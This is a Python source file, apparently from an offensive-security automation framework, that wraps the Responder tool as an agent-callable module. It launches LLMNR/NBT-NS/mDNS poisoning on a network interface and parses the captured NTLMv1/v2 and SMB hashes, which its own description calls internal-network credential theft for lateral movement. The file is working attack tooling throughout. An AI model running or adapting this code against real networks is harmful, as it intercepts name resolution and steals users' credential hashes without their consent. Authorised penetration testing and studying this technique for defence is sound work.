"""Responder LLMNR/NBT-NS/mDNS 投毒工具"""
from __future__ import annotations
from typing import Any, Dict, Optional
from tools.base_tool import BaseTool, ToolCategory, ToolMetadata, ToolParameter, ToolResult


class ResponderTool(BaseTool):
    metadata = ToolMetadata(
        name="responder",
        description="Responder LLMNR/NBT-NS/mDNS 投毒工具，用于内网凭证窃取（NTLMv1/v2 Hash）。",
        category=ToolCategory.LATERAL_MOVEMENT,
        tags=["responder", "poisoning", "llmnr", "ntlm", "mitm", "hash"],
        references=["https://github.com/lgandx/Responder"],
        parameters=[
            ToolParameter(name="interface", type="string", description="监听网络接口（如 eth0）", default="eth0"),
            ToolParameter(name="analyze", type="boolean", description="分析模式（不投毒）", default=False),
            ToolParameter(name="output_file", type="string", description="输出文件", default="/tmp/responder.db"),
        ],
        timeout_default=300.0,
    )

    async def run(self, **kwargs) -> ToolResult:
        cmd = ["responder", "-I", kwargs.get("interface", "eth0")]
        if kwargs.get("analyze"):
            cmd.append("-A")
        cmd.extend(["-w", "-r", "-b"])
        return await self._run_cmd(cmd, timeout=self.metadata.timeout_default)

    def parse_output(self, raw_output: str) -> Optional[Dict[str, Any]]:
        hashes = [l for l in raw_output.splitlines() if "NTLMv2" in l or "NTLMv1" in l or "SMB" in l]
        return {"hashes_collected": len(hashes), "hashes": hashes[:20]}
